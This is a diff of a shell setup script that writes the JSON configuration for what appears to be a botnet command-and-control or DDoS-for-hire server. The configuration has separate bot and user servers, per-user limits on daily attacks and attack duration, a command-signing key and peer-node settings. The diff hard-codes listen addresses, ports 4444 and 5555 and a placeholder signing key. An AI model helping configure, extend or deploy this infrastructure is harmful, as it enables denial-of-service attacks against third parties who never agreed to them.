@@ -92,15 +92,15 @@ cd ..
 
 cat > $CONFIG_FILE <<EOL
 {
-  "users_file": "$USERS_FILE",
+  "users_file": "users.json",
   "audit_log_file": "audit.log",
-  "bot_server_ip": "$IP_ADDRESS",
-  "user_server_ip": "$IP_ADDRESS",
-  "bot_server_port": "443",
-  "user_server_port": "4443",
-  "cert_file": "$CERTS_DIR/server.pem",
-  "key_file": "$CERTS_DIR/server.key",
-  "session_timeout": 3600000000000,
+  "bot_server_ip": "0.0.0.0",
+  "user_server_ip": "0.0.0.0",
+  "bot_server_port": "4444",
+  "user_server_port": "5555",
+  "cert_file": "certs/server.crt",
+  "key_file": "certs/server.key",
+  "session_timeout": 3600,
   "max_conns": 1000,
   "max_read_size": 4096,
   "max_log_size": 10485760,
@@ -108,19 +108,15 @@ cat > $CONFIG_FILE <<EOL
   "max_daily_attacks": 100,
   "max_attack_duration": 3600,
   "max_sessions_per_user": 3,
-  "min_password_length": 8,
+  "min_password_length": 12,
   "password_complexity": true,
   "max_connections_per_ip": 5,
   "ddos_protection": true,
   "max_conn_rate": 10,
-  "syn_flood_threshold": 5,
-  "reset_token_validity": 3600000000000,
-  "pinned_cert_file": "$CERTS_DIR/pinned.crt",
-  "command_signing_key": "$COMMAND_SIGNING_KEY",
-  "geo_distributed": false,
-  "node_id": "$(hostname)",
-  "node_secret": "$NODE_SECRET",
-  "peer_nodes": []
+  "syn_flood_threshold": 50,
+  "reset_token_validity": 3600,
+  "pinned_cert_file": "certs/pinned.crt",
+  "command_signing_key": "your_very_secure_signing_key_here_change_me"
 }
 EOL
 
